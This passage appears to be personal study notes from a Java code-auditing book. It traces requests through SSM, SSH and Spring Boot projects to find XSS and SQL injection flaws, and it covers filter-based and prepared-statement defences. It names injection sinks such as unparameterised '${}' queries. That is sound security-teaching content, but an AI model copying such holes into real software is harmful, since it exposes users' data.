是一个接口，其主要作用是过滤请求，实现请求的拦截或者放行，并且添加新的功能。</p><p>众所周知，接口其实是一个标准，所以我们想要编写自己的过滤器，自然也要遵守这个标准，即实现Filter接口。</p><p>Filter接口中有3个方法，这里进行简单介绍。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile">init方法：在创建完过滤器对象之后被调用。只执行一次。<br>doFilter方法：执行过滤任务方法。执行多次。<br>destroy方法：Web服务器停止或者Web应用重新加载，销毁过滤器对象。<br></code></pre></td></tr></table></figure><p>当 Servlet 容器开始调用某个Servlet程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否激活 service 方法。</p><p>不难看出，需要我们重点关注的方法是doFilter方法，如图7-38所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011757616.png" alt="image-20220501175743499"></p><p>图7-38　doFilter方法</p><p>这里的request参数和response参数可以理解为封装了请求数据和响应数据的对象，需要过滤的数据存放在这两个对象中。</p><p>对于最后一个参数FilterChain，通过名称可以猜测这个参数是一个过滤链。查看FilterChain的源码，如图7-39所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011758372.png" alt="image-20220501175807252"></p><p>图7-39　查看FilterChain的源码</p><p>可以发现FilterChain是一个接口，而且该接口只有一个doFilter方法。FilterChain参数存在的意义就在于，在一个 Web 应用程序中可以注册多个 Filter 程序，每个 Filter 程序都可以对一个或一组Servlet 程序进行拦截。如果有多个 Filter 程序，就可以对某个 Servlet 程序的访问过程进行拦截，当针对该 Servlet 的访问请求到达时，Web 容器将把多个 Filter 程序组合成一个 Filter 链（也叫作过滤器链）。</p><p>&#x3D;&#x3D;Filter 链中的各个 Filter 的拦截顺序与它们在 web.xml 文件中的映射顺序一致，在上一个Filter.doFilter 方法中调用 FilterChain.doFilter 方法将激活下一个 Filter的doFilter 方法，最后一个Filter.doFilter 方法中调用的 FilterChain.doFilter 方法将激活目标 Servlet的service 方法。&#x3D;&#x3D;</p><p>只要Filter链中任意一个 Filter 没有调用FilterChain.doFilter 方法，则目标 Servlet的service方法就都不会被执行。</p><p>读者应该发现，虽然FilterChain名称看起来像过滤器，但是调用chain.dofilter方法似乎并没有执行任何类似过滤的工作，也没有任何类似黑名单或者白名单的过滤规则。</p><p>在调用chain.dofilter方法时，我们传递了两个参数：&#x3D;&#x3D;new XSSRequestWrapper((HttpServletRequest) request&#x3D;&#x3D;)和response，就是说我们传递了一个XSSRequestWrapper对象和ServletRespons对象，我们关心的当然是这个XSSRequestWrapper对象。</p><p>在传递参数的过程中，我们通过调用XSSRequestWrapper的构造器传递了HttpServletRequest对象，这里简单从继承关系向读者展示HttpServletRequest和ServletRequest的关系，如图7-40所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011818147.png" alt="image-20220501181811972"></p><p>图7-40　HttpServletRequest和ServletRequest的关系</p><p>这里生成一个XSSRequestWrapper对象并传入了参数，如图7-41所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011819751.png" alt="image-20220501181927636"></p><p>图7-41　生成一个XSSRequestWrapper对象</p><p>filter下面有一个叫作XSSRequestWrapper的类，如图7-42所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011821529.png" alt="image-20220501182111506"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011821746.png" alt="image-20220501182134603"></p><p>可以发现过滤行为在这里进行，而XssFilter的存在只是在链式执行过滤器，并最终将值传给Servlet时调用XSSRequestWrapper来进行过滤并获取过滤结果。</p><p>这里不再对过滤规则过多介绍，网上有很多好的过滤规则。</p><p>可能有许多读者不明白为什么不将过滤的逻辑代码写在XssFilter中，而是重新编写一个类？这样做首先是为了解耦，其次是因为&#x3D;&#x3D;XSSRequestWrapper继承了一个类 HttpServletRequestWrapper。&#x3D;&#x3D;</p><p>查看HttpServletRequestWrapper类的继承关系，如图7-43所示。<img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220501182259218.png" alt="image-20220501182259218"></p><p>可以看到HttpServletRequestWrapper实现了HttpServletRequest接口。我们的想法是尽可能将请求中有危害的数据或者特殊符号过滤掉，然后将过滤后的数据转发向后面的业务代码并继续执行，而不是发现请求数据中有特殊字符就直接停止执行，抛出异常，返回给用户一个400页面。因此要修改或者转义HttpServletRequest对象中的恶意数据或者特殊字符。然而HttpServletRequest对象中的数据不允许被修改，也就是说，HttpServletRequest对象没有为用户提供直接修改请求数据的方法。</p><p>因此就需要用到HttpServletRequestWrapper类，这里用到了常见的23种中设计模式之一的装饰者模式，限于篇幅原因这里不对装饰者模式进行讲解，感兴趣的读者可以自行研究。HttpServletRequestWrapper类为用户提供了修改request请求数据的方法，这也是需要单写一个类来进行过滤的原因，是因为框架就是这么设计的。</p><p>当HttpServletRequestWrapper过滤完请求中的数据并完成修改后，返回并作为chain.doFilter方法的形参进行传递。</p><p>最后一个 Filter.doFilter 方法中调用的 FilterChain.doFilter方法将激活目标Servlet的service方法。</p><p>由于我们没有配置第二个Filter，因此XssFilter中的chain.doFilter将会激活Servlet的service方法，即DispatcherServlet的service方法，然后数据将传入Spring MVC的Controller层并交由BookController来处理。</p><p>现在使用Filter来演示效果。首先设置断点，如图7-44所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011826527.png" alt="image-20220501182634331"></p><p>图7-44　设置断点</p><p>再次执行到这里时，XSS语句中的特殊字符已经被Filter转义，如图7-45和图7-46所示，自然也不会存在XSS的问题了<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011827197.png" alt="image-20220501182712054"></p><p>图7-45　XSS语句中的特殊字符被Filter转义<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011827798.png" alt="image-20220501182752661"></p><p>图7-46　XSS语句被转移</p><h4 id="8．SSM框架审计思路总结"><a href="#8．SSM框架审计思路总结" class="headerlink" title="8．SSM框架审计思路总结"></a>8．SSM框架审计思路总结</h4><p>SSM框架的审计思路其实就是代码的执行思路。</p><p>与审计非SSM框架代码的主要区别在于SSM框架的各种XML配置，注解配置需要用户根据XML中的配置和注解来查看代码的执行路径、SSM框架中常见的注解和注解中的属性，以及常见的标签和标签的各个属性。</p><p>审计漏洞的方式与正常的Java代码审计没有区别，网上有很多非常优秀的Java代码审计文章，关于每个漏洞的审计方式写得都非常全面，我们需要做的只是将其移植到SSM框架的审计中来。明白SSM的执行流程后自然就明白怎样在SSM框架中跟踪参数，例如刚刚介绍的XSS漏洞。我们根据XML中的配置和注解中的配置找到了MyBatis的mapper.xml这个映射文件，以及最终执行的以下命令。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011834532.png" alt="image-20220501183437763"></p><p>观察这个SQL语句，发现传入的books参数直到SQL语句执行的前一刻都没有经过任何过滤处理，所以此处插入数据库的参数自然是不可信的脏数据。再次查询这条数据并返回到前端时就非常可能造成&#x3D;&#x3D;存储型XSS攻击&#x3D;&#x3D;。</p><p>在审计这类漏洞时，最简单的方法是先在web.xml中查看有没有配置相关的过滤器，如果有则查看过滤器的规则是否严格，如果没有则很有可能存在漏洞。</p><p>而在&#x3D;&#x3D;预编译&#x3D;&#x3D;的情况下，程序会提前将SQL语句编译好，程序执行时只需要将传递进来的参数交由数据库进行操作即可。此时不论传递进来的参数是什么，都不会被当作SQL语句的一部分，因为真正的SQL语句已经提前被编译好了，所以即使不过滤也不会产生SQL注入这类漏洞，以下面mapper.xml中的&#x3D;&#x3D;SQL语句&#x3D;&#x3D;为例。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011839544.png" alt="image-20220501183940434"></p><p>{bookName}这种形式就是采用了预编译的形式传参。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205011839685.png" alt="image-20220501183955571"></p><p>而’${bookName}’这种写法没有使用预编译的形式传递参数，此时如果不对传入的参数进行过滤和校验，就会产生SQL注入漏洞，’${xxxx}’和#{xxxx}其实就是JDBC的Statement和PreparedStatement对象。</p><h3 id="7-1-2-SSH框架审计技巧"><a href="#7-1-2-SSH框架审计技巧" class="headerlink" title="7.1.2　SSH框架审计技巧"></a>7.1.2　SSH框架审计技巧</h3><h4 id="1．SSH框架简介"><a href="#1．SSH框架简介" class="headerlink" title="1．SSH框架简介"></a>1．SSH框架简介</h4><p>前面介绍了SSM框架，即Spring MVC、Spring和MyBatis。接下来介绍JavaWeb曾经开发的SSH框架，即Struts2、Spring和Hibernate。</p><p>自 Struts2诞生以来，漏洞层出不穷，直到最近的S2-059和S2-060，高危漏洞仍然不计其数。由于安全上的种种原因，以及Spring MVC和Spring Boot等框架的兴起，Struts2逐渐淡出了开发人员的视野。但是很多企业的项目还是使用Struts2进行开发的，所以Java 代码审计人员非常有必要了解该框架的审计方法。</p><p>接下来介绍DAO层的框架，它和MyBatis一样同为ORM框架的Hibernate。虽然二者同为ORM框架，但是区别还是挺大的，后续讲解中会介绍两个框架之间的区别，以及审计Hibernate时的注意事项。</p><h4 id="2．Java-SSH框架审计技巧"><a href="#2．Java-SSH框架审计技巧" class="headerlink" title="2．Java SSH框架审计技巧"></a>2．Java SSH框架审计技巧</h4><p>我们将前面的SSM的Demo进行重写，方便两个框架之间进行比较，从而加深理解，项目目录结构如图7-47所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012014332.png" alt="image-20220501201223322"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012013374.png" alt="image-20220501201357203"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012015936.png" alt="image-20220501201451383"></p><p>图7-47　项目目录结构</p><p>如前所述，在有web.xml的情况下，审计一个项目时首先需要查看该文件，以便对整个项目有一个初步的了解。</p><p>web.xml内容如图7-48所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012027532.png" alt="image-20220501202749384"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012029909.png" alt="image-20220501202910789"></p><p>web.xml文件中，第一项配置表明了Spring配置文件的所在位置，第二项配置是一个Filter，这里明显不同于SSM中web.xml的配置，本质上都是Tomcat通过加载web.xml文件读取其中的信息来判断将前端的请求交由谁进行处理。Spring MVC的选择是配置一个Servlet，而Struts2的选择是配置一个Filter。而且细心的读者还会发现，在配置Spring MVC的DispatcherServlet时，Spring配置文件（也就是applicationContext.xml位置）是直接通过配置参数传入的，而这里则是通过配置一个context-param。而且這個cntext-param放在哪都無所謂</p><p>Struts2配置Filter，而Spring MVC配置Servlet，二者的区别放在章节最后总结处进行详细讲解。</p><p>接下来查看applicationContext.xml，该配置文件内容如图7-49所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012032950.png" alt="image-20220501203254800"></p><p>一個專門配置bean 一個專門配置common 當然是因爲我的項目才這樣<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012037501.png" alt="image-20220501203754266"></p><p>图7-49　查看applicationContext.xml</p><p>该文件中主要配置了项目所需的各种bean，这里可以清楚地看到使用的是c3p0的连接池。接着是配置sessionFactory，并将连接池作为参数传入，同时作为参数传输的还有一个hibernate的总配置文件，以及一个hibernate的映射文件。接下来是配置每个Action的bean对象(bean对象可以单独放进一个xml)。</p><p>查看完Spring的配置文件后，在审计SSH框架的代码之前还需要对一个配置文件有所了解，即Struts2的核心配置文件struts2.xml，该配置文件的详细内容如图7-50所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012051517.png" alt="image-20220501205143329"></p><p>图7-50　查看struts2.xml文件</p><p>该配置文件中配置了Sturts2中最核心的部分，即所谓的Action。</p><p>这里配置的每一个Action都有其对应的请求URI和处理该请求的Class，以及所对应的方法。我们先从allBook这个action开始讲解，该功能用于首页所有书籍的展示。</p><p>allBook action对应的class的全限定类名是com.sshProject.action.QueryAllBookAction。class属性后面还有一个method属性，该属性的作用就是执行指定的方法，默认值为“execute”，当不为该属性赋值时，默认执行Action的“execute”方法。</p><p>每个action标签中还会有一些&#x3D;&#x3D;result子标签&#x3D;&#x3D;，该标签有两个属性，分别是name属性和type属性。name属性的主要作用是匹配返回的字符串，并选择与之对应的页面。这里当&#x3D;&#x3D;QueryAllBookAction&#x3D;&#x3D;执行完成后，如果返回的字符串是success，则返回queryBookByID.jsp；如果返回的字符串是false，则返回error.jsp。</p><p>&#x3D;&#x3D;type属性的值代表去往JSP页面是通过转发还是通过重定向&#x3D;&#x3D;。转发和重定向这两种方式的区别为，转发是服务端自己的行为，在转发的过程中携带Controller层执行后的返回结果；而重定向则需要客户端的参与，通过300状态码让客户端对指定页面重新发起请求。</p><p>通俗说就是我们遇到某些网页的控件  点击之后只有那个模块会跳转 这就是转发</p><p>如果整个页面都跳转 这就是重定向</p><p>介绍完Action标签中的常见属性，下一步就是追踪QueryAllBookAction这个类，来详细观察其中的内容。根据result的标签的配置，struts2会执行QueryAllBookAction类的execute方法，该方法的实现过程如图7-51所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012108611.png" alt="image-20220501210825852"></p><p>图7-51　execute方法的实现过程</p><p>如果只看execute方法的内容，可能会不太清楚其中的一些变量是如何获取的。QueryAllBookAction类的剩余部分如图7-52所示。</p><p>下面讲的是剩下的queryALLBOOKcation<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012114876.png" alt="image-20220501211314011"></p><p>图7-52　QueryAllBookAction类的剩余部分</p><p>这里的bookService就是Web三层架构中服务层的部分。setBookService方法在当前QueryAllBookAction实例化时会被一个名为params的拦截器进行调用，并为bookService变量进行赋值。</p><p>QueryAllBookAction除继承ActionSupport这个父类以外，还实现了RequestAware接口，该接口内容如图7-53所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012114628.png" alt="image-20220501211400501"></p><p>图7-53　RequestAware接口</p><p>interface是接口的意思</p><p>该接口内只有一个方法，目的是获取request对象中的全部attributes的一个&#x3D;&#x3D;map对象&#x3D;&#x3D;。如果想要获取&#x3D;&#x3D;整个request对象&#x3D;&#x3D;，则需要实现&#x3D;&#x3D;ServletRequestAware&#x3D;&#x3D;，该接口内容如图7-54所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012117917.png" alt="image-20220501211714790"></p><p>图7-54　ServletRequestAware接口</p><p>在介绍完QueryAllBookAction对象的属性如何被赋值之后，最关键的还是execute方法，在图7-51中可以看到在execute方法中调用了bookService.queryAllBook()方法。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012120746.png" alt="image-20220501212017597"></p><p>图7-55　BookService接口</p><p>该接口中针对常用的增、删、改、查各定义对应的抽象方法，并由&#x3D;&#x3D;BooksServiceImpl&#x3D;&#x3D;(这个怎么推出来的 估计就是说 当我们发现这样一个功能接口 我们就要去搜索它 然后找出引用他的函数。而且要名字比较像的那种)来具体负责实现。在BooksServiceImpl中找到queryAllBook方法，如图7-56所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012125616.png" alt="image-20220501212527483"></p><p>图7-56　queryAllBook方法</p><p>这里调用了一个bookManagerDao.queryAllBook方法，bookManagerDao&#x3D;&#x3D;明显&#x3D;&#x3D;(咋看出来的，因为不需要实例化？)是一个全局变量，观察其类型是BookManagerDao类型，如图7-57所示。</p><p>这里调用了一个bookManagerDao.queryAllBook方法，bookManagerDao明显是一个全局变量，观察其类型是BookManagerDao类型，如图7-57所示。（大小写不一样）<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012127794.png" alt="image-20220501212706670"></p><p>图7-57　bookManagerDao变量</p><p>这里要讲到Spring的&#x3D;&#x3D;依赖注入&#x3D;&#x3D;，BooksServiceImpl类提供了bookManagerDao变量的&#x3D;&#x3D;setter&#x3D;&#x3D;方法，然后使用Spring的依赖注入在BooksServiceImpl类实例化时&#x3D;&#x3D;通过读取配置信息&#x3D;&#x3D;后调用setter方法将值注入bookManagerDao变量中。这里提到了读取配置文件，接下来查看该项目的Spring配置文件，即applicationContext.xml中的配置信息，如图7-58所示。</p><p>首先是导入了jdbc的配置文件，并配置了连接池和SessionFactory。然后配置了bookManagerDao和bookService两个bean，并将bookManagerDao注入bookService，Spring在启动时会读取applicationContext.xml并根据其中配置的bean的顺序将其&#x3D;&#x3D;逐个进行实例化&#x3D;&#x3D;，同时对每个bean中指定的属性进行注入。Spring依赖注入的方式有很多种，这里介绍的通过配置xml然后通过&#x3D;&#x3D;setter方法进行注入只是其中一种&#x3D;&#x3D;。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012130189.png" alt="image-20220501213042002"></p><p>从applicationContext.xml配置文件中可以发现BooksServiceImpl类中的bookManagerDao存储的是一个BookManagerDao对象，所以定位到BookManagerDao类的queryAllBook方法来看其具体实现，其内容如图7-59所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012135530.png" alt="image-20220501213512384"></p><p>这里进行了一次查询操作，并将查询的结果封装进一个list对象中进行返回。以上就是SSH框架处理一个用户请求的大致流程，生产环境中的业务比较复杂，会对各种参数进行合法性校验，但是整体的审计思路不会改变，就是按照程序执行的流程，关注程序每一步对传入参数的操作。</p><p>该项目中有一个根据ID查询书籍的功能。selectBook.jsp中的表单内容如图7-60所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012136388.png" alt="image-20220501213654263"></p><p>图7-60　selectBook.jsp中的表单</p><p>&#x3D;&#x3D;根据表单提交的url在struts.xml中查询&#x3D;&#x3D;，找到处理该请求的Action，如图7-61所示。</p><p>就是根据上面的queryBookId，但是实际上会有很多使用了queryBookId。所以我们可以先找到queryBookId的文件。因为很多引用会同时写在这个文件里面。然后查询action <img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012139463.png" alt="image-20220501213959336"></p><p>图7-61　处理请求的Action</p><p>然后到&#x3D;&#x3D;QueryBookByIdAction&#x3D;&#x3D;类中查看该类的&#x3D;&#x3D;execute方法&#x3D;&#x3D;的具体内容，如图7-62所示。</p><p>图7-62　查看execute方法</p><p>结合之前的表单提交的一个图书的id，大概可知此处是通过传入的图书id在后台数据库中进行查询。根据之前的观察已知bookService变量指向的是一个BooksServiceImpl对象，所以找到该类中的queryBookById方法，该方法的具体内容如图7-63所示。<img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220502142001014.png" alt="image-20220502142001014"></p><p>同样根据之前的观察结果，可以发现bookManagerDao变量指向的是一个BookManagerDao对象。在BookManagerDao类中找到queryBookById方法，如图7-64所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021423189.png" alt="image-20220502142319112"></p><p>图7-64　查看queryBookById方法（二）</p><p>通过这一段的审计，不难发现图书的id参数是由前端传入的，最终拼接进了SQL语句中并代入数据库中进行查询。在这整个流程中程序并没有对id参数进行任何校验，因此很有可能产生SQL注入漏洞。</p><p>代码审计的思路就是要关注&#x3D;&#x3D;参数是否是前端传入，参数是否可控，在对这个参数处理的过程中是否有针对性地对参数的合法性进行校验&#x3D;&#x3D;，如果同时存在&#x3D;&#x3D;以上3个问题&#x3D;&#x3D;，则很可能会存在漏洞。</p><p>以该SQL注入漏洞为例，常用的防御SQL注入的手段有两种：一种是通Filter进行过滤，另一种是使用预编译进行参数化查询，这两种方式各有优缺点，也有各自的应用场景。</p><p>自定义Filter时需要实现Javax.servlet.Filter接口，该接口内容如图7-65所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021424959.png" alt="image-20220502142439785"></p><p>图7-65　Javax.servlet.Filter接口</p><p>审计过程中最需要注意的是其中的doFilter方法，过滤的规则一般都在该方法中。</p><p>以下是该接口的一个自定义Filter对doFilter方法的具体实现，内容如图7-66所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021427168.png" alt="image-20220502142722030"></p><p>在doFilter方法中，遍历获取了查询请求中的参数，并将请求参数传递给sqlValidate函数进行匹配，所以需要再去观察sqlValidate函数的具体内容，如图7-67所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021429772.png" alt="image-20220502142857162"></p><p>图7-67　查看sqlValidate函数</p><p>根据图7-67中的代码可见，传递进来的参数会先被转化成小写，然后和basdstr中定义的SQL语句进行比对，如果比对成功则返回flase，返回到doFilter方法中就会终止程序继续执行，并重定向至error.jsp页面。</p><p>Strut2自身也提供了验证机制，例如ActionSupport类中提供的validate方法，如图7-68所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021430022.png" alt="image-20220502143017895"></p><p>图7-68　validate方法</p><p>&#x3D;&#x3D;当一个Action中重写ActionSupport中的validate方法后，Struts2每次执行该Action时都会最先执行该Action中的validate&#x3D;&#x3D;，以起到检验参数合法性的作用。这里将之前Filter中doFilter方法的过滤规则直接复制过来进行展示，如图7-69所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021432221.png" alt="image-20220502143204043"></p><p>图7-69　在action中重写的valicate  使用了doFilter方法的过滤规则</p><p>如此一来，每一次Struts2执行QueryBookByIdAction的execute方法时都会首先调用validate方法，这样每当传入的参数中包含恶意SQL语句就会终止执行并重定向至error.jsp，所以如果开发人员在开发过程中没有使用Filter来进行过滤，采用上述重写validate方法的方式也可以起到防止SQL注入的目的。</p><p>除使用上述过滤方式来实现防止SQL注入外，在审计过程中还有很重要的一点就是&#x3D;&#x3D;预编译&#x3D;&#x3D;，除可以使用原生的SQL语句外，Hibernate本身还自带一个名为HQL的面向对象的查询语言，该语言并不被后台数据库所识别，所以在执行HQL语句时，&#x3D;&#x3D;Hibernate需要将HQL翻译成SQL语句后交由后台数据库进行查询操作&#x3D;&#x3D;。将原生HQL语句改写成SQL语句，可以很便捷地在众多不同的数据库中进行移植，只需要修改配置而不必再对HQL语句进行任何改写。但是要注意的一点就是&#x3D;&#x3D;HQL是面向对象的查询语句，只支持查询操作，对于增、删、改等操作是不支持的。&#x3D;&#x3D;</p><p>使用之前的查询语句来举例，SQL语法和HQL语法的简单区别如图7-70所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021434166.png" alt="image-20220502143444037"></p><p>图7-70　SQL语法和HQL语法的简单区别</p><p>可以发现SQL语句是依据bookID字段的值从SSH_PROJECT数据库的BOOKS表中查询出指定的数据，而HQL的语句则更像是从Books对象中取出指定bookID属性的对象。Hibernate可以像调用对象属性一样进行数据查询，&#x3D;&#x3D;是因为事先针对要查询的POJO对象进行映射&#x3D;&#x3D;，映射文件的具体内容如图7-71所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021437058.png" alt="image-20220502143720883"></p><p>图7-71　映射文件的具体内容</p><p>POJO类的每个属性都与表中的字段进行一一映射，这样HQL才能用类似于操作对象属性的方式进行指定数据查询。与SQL语句相似，HQL也存在注入问题，但是限制颇多，以下列举一些HQL注入的限制。</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss">（<span class="hljs-number">1</span>）无法查询未进行映射的表。<br>（<span class="hljs-number">2</span>）在模型关系不明确的情况下无法使用“<span class="hljs-built_in">UNION</span>”进行查询。（<span class="hljs-number">3</span>）HQL 表名、列名对大小写敏感，查询时使用的列名大小写必须与映射类的属性一致。<br>（<span class="hljs-number">4</span>）不能使用*、<span class="hljs-meta">#、--。</span><br>（<span class="hljs-number">5</span>）没有延时函数。<br></code></pre></td></tr></table></figure><p>所以在生产环境中利用HQL注入是一件很困难的事。但是防御HQL注入时，除前面介绍的使用过滤器进行过滤的方法以外，还可以使用图7-72所示的预编译形式。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021442370.png" alt="image-20220502144254236"></p><p>图7-72　预编译形式</p><h3 id="7-1-3-Spring-Boot框架审计技巧"><a href="#7-1-3-Spring-Boot框架审计技巧" class="headerlink" title="7.1.3　Spring Boot框架审计技巧"></a>7.1.3　Spring Boot框架审计技巧</h3><h4 id="1．Spring-Boot简介"><a href="#1．Spring-Boot简介" class="headerlink" title="1．Spring Boot简介"></a>1．Spring Boot简介</h4><p>Spring Boot是由Pivotal团队在2013年开始研发、2014年4月发布第一个版本的全新、开源的轻量级框架。它基于Spring 4.0设计，不仅继承了Spring框架原有的优秀特性，而且通过简化配置进一步简化了Spring应用的整个搭建和开发过程。另外，Spring Boot通过集成大量的框架使依赖包的版本冲突以及引用的不稳定性等问题得到了很好的解决。</p><h4 id="2．审计思路"><a href="#2．审计思路" class="headerlink" title="2．审计思路"></a>2．审计思路</h4><p>使用Spring Boot框架审计时，首先是将前面介绍的SSH和SSM所使用的案例改写成Spring Boot的形式。项目文件结构如图7-73所示，整体看上去与SSM架构的Demo非常相似。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021643457.png" alt="image-20220502164244002"></p><p>图7-73　项目文件结构</p><p>网上随便找了个spring写的后台代码 基本上框架还是差不多的  命名有些差别</p><p>从文件结构中可以发现，以往我们在审计过程中最先注意到的web.xml文件在Spring Boot中被取消，那么审计如何开始呢？Spring Boot开发的项目都有一个主配置类，通常放置于包的最外层，当前项目的主配置类是SpringbootdemoApplication类，其代码如图7-74所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021646662.png" alt="image-20220502164601524"></p><p>图7-74　查看SpringbootdemoApplication类的代码</p><p>再查看配置文件application.properties，内容如图7-75所示</p><p>其中只配置了jdbc的链接信息，以及一个类似mybatis配置文件存放目录的信息。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021648291.png" alt="image-20220502164817148"></p><p>图7-75　查看配置文件application.properties的内容</p><p>其中只配置了jdbc的链接信息，以及一个类似mybatis配置文件存放目录的信息。</p><p>看到这里，貌似审计进入了一个死胡同，如果不清楚Spring Boot的执行流程，审计就无法继续进行。这时就需要了解Spring Boot非常关键的一个知识点——自动装配</p><p>Spring Boot项目的主配置类SpringbootdemoApplication有一个注解为@SpringBootApplication，&#x3D;&#x3D;当一个类上存在该注解时，该类才是Spring Boot的主配置类。当Spring Boot程序执行时，扫描到该注解后，会对该类当前所在目录以及所有子目录进行扫描&#x3D;&#x3D;，&#x3D;&#x3D;这也是为什么SpringbootdemoApplication这个主配置类一定要写在包中所有类的最外面，因此省略了之前在SSH以及SSM中的种种XML配置。&#x3D;&#x3D;讲到这里，相信读者应该意识到我们在SSH项目以及&#x3D;&#x3D;SSM项目中通过XML配置的信息&#x3D;&#x3D;，在这里都要改为&#x3D;&#x3D;使用注解&#x3D;&#x3D;来进行配置。</p><p>了解这一点之后，审计的思路似乎清晰了起来。根据MVC的设计思想，除了Filter 和Listener以外，首先在接收前端传入参数的就是Controller层。Controller层的内容如图7-76所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021656225.png" alt="image-20220502165636077"></p><p>图7-76　Controller层的内容</p><p>可以看到其中的代码与使用SSM书写时完全相同，这里以根据ID查询书籍的功能为例来进行讲解。同审计SSH和SSM框架时的思路相同，Controller层的queryBookById方法在接收到前端传入的ID参数后，调用了Service层来对ID参数进行处理，所以跟进BookService，如图7-77所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021656801.png" alt="image-20220502165655687"></p><p>图7-77　查看BookService的内容</p><p>BookService是一个接口，该接口只有一个实现类，所以到BookServiceImpl类中进行观察，BookServiceImpl类的部分代码如图7-78所示。</p><p>Service层并没有做更多的操作，只是简单调用了DAO层的BookMapper，并将ID作为参数传递进去，所以我们继续追踪BookMapper。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021658137.png" alt="image-20220502165852005"></p><p>如图7-79所示，BookMapper只是一个接口，且根据图7-80所示，BookMapper并没有实现类，那么程序是如何调用BookMapper中定义的方法的呢？这里的DAO层使用的是MyBatis框架，MyBaits框架在配置和数据层交互时有两种方式：一种是通过在接口方法上直接使用注解，还有一种就是使用XML来进行配置。很明显，我们在BookMapper的方法中没有看到相关注解，因此应该搜索相关的XML配置文件。<img src="C:/Users/e%27e%27t/AppData/Roaming/Typora/typora-user-images/image-20220502181155351.png" alt="image-20220502181155351"></p><p>图7-79　查看BookMapper接口<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021822534.png" alt="image-20220502182254341"></p><p>图7-80　BookMapper没有实现类</p><p>项目的resource目录下存放有BookMapper的XML配置文件，其部分内容如图7-81所示。同样在审计过程要注意程序在与数据库交互时有没有使用预编译，如果没有，则需要注意传入数据库的参数是否经过过滤和校验。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205021824986.png" alt="image-20220502182443765"></p><p>图7-81　BookMapper配置文件的部分内容</p><p>以上就是一个使用Spring Boot搭建简单的Web项目的执行流程，经过拆解和分析发现Spring Boot的执行流程和SSM的大致相同，差别只是Spring Boot构建的Web项目中缺少很多配置文件。</p><h2 id="7-2-开发框架使用不当范例（Struts2-远程代码执行）"><a href="#7-2-开发框架使用不当范例（Struts2-远程代码执行）" class="headerlink" title="7.2　